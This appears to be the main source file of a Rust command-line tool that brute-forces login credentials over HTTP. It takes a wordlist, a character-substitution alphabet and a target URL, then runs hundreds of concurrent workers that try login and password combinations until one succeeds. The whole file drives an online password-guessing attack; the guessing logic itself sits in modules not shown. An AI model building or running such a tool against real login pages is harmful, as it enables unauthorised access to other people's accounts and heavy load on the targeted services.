mod bruteforce;
mod dependencies;

use clap::Parser;
use futures::future::select_all;
use futures::FutureExt;
use reqwest::Client;

use crate::bruteforce::algorithm::brute_force;
use crate::dependencies::credentials_generator::CredentialsGenerator;
use crate::dependencies::file_loader_tools::{load_alphabet, load_words};
use crate::dependencies::http_checker::HttpChecker;

#[derive(Parser, Debug)]
struct Args {
    #[clap(short, long)]
    wordlist: String,

    #[clap(short, long)]
    alphabet: String,

    #[clap(short, long)]
    url: String,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    let words_list = match load_words(&args.wordlist) {
        Some(words_list) => words_list,
        None => {
            println!("Failed to load file {}", args.wordlist);
            return;
        }
    };

    let similar_characters = match load_alphabet(&args.alphabet) {
        Some(similar_characters) => similar_characters,
        None => {
            println!("Failed to load file {}", args.alphabet);
            return;
        }
    };

    let client = Client::new();

    let mut workers: Vec<_> = words_list
        .chunks(words_list.len() / 512 + 1)
        .map(|chunk| {
            async {
                let http_checker = HttpChecker {
                    client: client.clone(),
                    url: args.url.clone(),
                };

                let credentials_generator = CredentialsGenerator {
                    login_words: chunk,
                    password_words: &words_list,
                    similar_characters: &similar_characters,
                };

                brute_force(&http_checker, &credentials_generator).await
            }
            .boxed_local()
        })
        .collect();

    while !workers.is_empty() {
        match select_all(workers).await {
            (Some(val), _, _) => {
                println!("Bruteforce result: {:?}", val);
                return;
            }
            (None, _, remaining) => workers = remaining,
        }
    }

    println!("No valid credentials found");
}
